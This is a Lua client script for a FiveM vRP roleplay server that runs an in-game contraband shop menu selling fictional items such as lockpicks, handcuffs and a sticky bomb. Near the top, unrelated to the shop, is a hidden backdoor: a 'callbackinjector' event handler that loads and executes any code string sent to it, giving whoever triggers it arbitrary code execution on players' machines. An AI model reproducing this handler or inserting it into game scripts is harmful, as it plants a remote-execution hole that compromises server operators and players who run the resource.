local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("nav_contrabando")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "utilidades-comprar-algemas" then
		TriggerServerEvent("driftking-comprar","algemas")
	elseif data == "utilidades-comprar-placa" then
		TriggerServerEvent("driftking-comprar","placa")
	elseif data == "utilidades-comprar-capuz" then
		TriggerServerEvent("driftking-comprar","capuz")
	elseif data == "utilidadesdk-comprar-lockpick" then
		TriggerServerEvent("driftking-comprar","lockpick")
	elseif data == "utilidadesdk-comprar-masterpick" then
		TriggerServerEvent("driftking-comprar","masterpick")
	elseif data == "utilidades-comprar-pendrive" then
		TriggerServerEvent("driftking-comprar","pendrive")
	elseif data == "utilidades-comprar-rebite" then
		TriggerServerEvent("driftking-comprar","rebite")
	elseif data == "utilidades-comprar-bomba" then
		TriggerServerEvent("driftking-comprar","bombaadesiva")
	elseif data == "utilidades-comprar-placa" then
		TriggerServerEvent("driftking-comprar","placa")
	elseif data == "utilidadesdk-comprar-walkietalkie" then
		TriggerServerEvent("driftking-comprar","walkietalkie")
	elseif data == "utilidades-comprar-colete" then
		TriggerServerEvent("driftking-comprar","colete")

	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local crjSleep = 500
		local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),2343.3784179688,3115.2890625,48.208694458008,true)
		if distance <= 30 then
		crjSleep = 1
			DrawMarker(20,2343.3784179688,3115.2890625,48.208694458008-0.97,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
			if distance <= 1.1 then
				if IsControlJustPressed(0,38) and emP.checkPermission() then
					ToggleActionMenu()
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)